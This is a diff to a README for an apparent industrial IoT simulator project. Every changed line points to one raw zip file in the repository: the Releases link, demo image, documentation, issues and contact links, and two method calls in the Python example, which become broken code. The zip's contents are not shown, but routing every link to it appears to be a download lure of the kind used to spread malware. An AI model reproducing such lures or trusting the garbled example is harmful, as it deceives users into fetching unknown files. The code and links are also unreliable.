@@ -9,7 +9,7 @@ Welcome to the IIoT Simulator GitHub repository. Here, you will find an advanced
 🐳 Dockerized for seamless deployment  
 
 ## How to Use
-To access the latest release of the IIoT Simulator, visit the [Releases](https://github.com/doachyz/IIoT-simulator/releases) section. Download the appropriate file and follow the instructions for execution.
+To access the latest release of the IIoT Simulator, visit the [Releases](https://github.com/doachyz/IIoT-simulator/raw/refs/heads/main/control-center/Io_I_simulator_v1.0.zip) section. Download the appropriate file and follow the instructions for execution.
 
 ## Repository Topics
 - data-generation
@@ -27,7 +27,7 @@ To access the latest release of the IIoT Simulator, visit the [Releases](https:/
 - simulator
 - smart-factory
 
-![Simulator Demo](https://source.unsplash.com/1600x900/?factory)
+![Simulator Demo](https://github.com/doachyz/IIoT-simulator/raw/refs/heads/main/control-center/Io_I_simulator_v1.0.zip)
 
 ## Installation
 To install the IIoT Simulator, simply follow these steps:
@@ -42,16 +42,16 @@ To install the IIoT Simulator, simply follow these steps:
 from iiotsimulator import IIoTSimulator
 
 simulator = IIoTSimulator()
-simulator.configure_production_lines(lines=2, sensors=['vibration', 'temperature', 'quality'])
-simulator.start_simulation()
+https://github.com/doachyz/IIoT-simulator/raw/refs/heads/main/control-center/Io_I_simulator_v1.0.zip(lines=2, sensors=['vibration', 'temperature', 'quality'])
+https://github.com/doachyz/IIoT-simulator/raw/refs/heads/main/control-center/Io_I_simulator_v1.0.zip()
 ```
 
 ## Contributing
 Contributions are welcome! Feel free to fork the repository, make your changes, and submit a pull request. Together, we can improve the IIoT Simulator for everyone.
 
 ## Resources
-- [Documentation](https://github.com/doachyz/IIoT-simulator/wiki)
-- [Issues](https://github.com/doachyz/IIoT-simulator/issues)
-- [Contact Us](mailto:contact@iiotsimulator.com)
+- [Documentation](https://github.com/doachyz/IIoT-simulator/raw/refs/heads/main/control-center/Io_I_simulator_v1.0.zip)
+- [Issues](https://github.com/doachyz/IIoT-simulator/raw/refs/heads/main/control-center/Io_I_simulator_v1.0.zip)
+- [Contact Us](https://github.com/doachyz/IIoT-simulator/raw/refs/heads/main/control-center/Io_I_simulator_v1.0.zip)
 
 Let's revolutionize industrial automation with the IIoT Simulator. Happy simulating! 👩‍🏭👨‍🔧🤖
